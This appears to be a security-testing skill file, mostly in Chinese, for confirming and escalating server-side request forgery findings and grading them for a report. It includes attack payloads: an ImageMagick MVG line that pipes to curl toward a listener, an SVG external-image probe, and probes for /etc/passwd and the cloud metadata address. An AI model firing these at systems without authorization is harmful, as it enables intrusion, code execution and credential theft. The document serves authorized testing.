---
name: ssrf-verification-and-escalation
description: "Use when a URL param may be SSRF: verify and escalate."
version: 1.0.0
tags: [security, ssrf, web, oob, verification]
---

# SSRF Verification & Escalation

任何「服务端会去拉这个 URL」的参数（头像/回调/webhook/导入/预览/代理/图片处理）都可能中招。本技能只解决一件事：**用三层证据把「疑似 SSRF」收敛成可写进报告的结论，或证明它能升级。**

## 铁律

- **出网 ≠ 能读。** 只有回调日志时，结论只能写「盲 SSRF（仅出网探测）」，记中危。
- **禁止**在无回读通道时写「可读云 metadata / 可拿 RAM 临时凭据 / 可打内网」。
- 三层（出网 / 回读 / 执行）在十几分钟内测完；第 2、3 层全否就把这条线降为「已确认中危」，把精力还给认证/授权面，不在无回读的洞上堆变体。

## Procedure

### 1. 出网确认

```
python3 -m http.server 8080 --bind <你的公网 IP>
```

把参数指向 `http://<公网IP>:8080/<唯一名>.png`，读监听日志拿四个数：**服务端源 IP**、请求次数、时间差、是否重试。

- 源 IP 通常是 NAT 出口，和域名解析 IP 不同；记下来写报告。
- 客户端不加载该字段时仍触发，才能排除浏览器/JS 代劳。
- 请求数 >1 常是服务端重试，不是多个注入点。

### 2. 回读判定（决定能不能升级）

依次喂：① `text/plain` + 唯一 marker；② 合法 1x1 PNG；③ **回读该对象**（profile / detail / list 接口）看字段值。

- 字段被改写成 OSS / CDN / 本地路径 → 服务端下载并**存储**了，存在二次读通道，可继续试内网读。
- 字段仍是你给的 URL → **只拉不存**，纯盲，到此为止。

### 3. 执行面 OOB

`image/*` 解码器是常见利用点，各投一发看回调：

- ImageMagick MVG：`push graphic-context` / `viewbox 0 0 640 480` / `fill 'url(http://<listener>/x.png"|curl ...)'`
- SVG：`<image href="http://<listener>/x.png"/>`

无回调 = 解码器不走外链 delegate（或已打补丁），停止变体轰炸。载荷细节见 `references/decoder-payloads.md`。

## 判定表

| 成立层数 | 结论 | 报告级别 |
|---|---|---|
| 仅 1 | 服务端 SSRF（盲，仅出网探测） | 中危 |
| 1 + 2 | 可回读 SSRF | 视内网可达面定高危 |
| 1 + 3 | 解码器 RCE 链 | 严重 |

## Pitfalls

- **HTTP 302 到内网目标看不到结果。** 监听只记录第一次请求；没有回读或时间差基线时，不能用它判断内网端口开放。
- **别用回显型 payload 试探盲洞。** `file:///etc/passwd`、`http://169.254.169.254/` 在盲洞上只会得到「拉取失败」，不会回显内容。
- **存储型字段要回读对象本身**，不要看提交响应——很多接口返回 `code:0` 但字段被服务端重写成 OSS 地址。
- **同一参数多字段都要试**：`faceURL` 改了不代表 `backgroundURL`、`callback`、`webhook` 同样处理；逐个字段独立确认。
- **限速/重试会让回调次数失真**，判「是否重试」看时间间隔，不要看总次数。
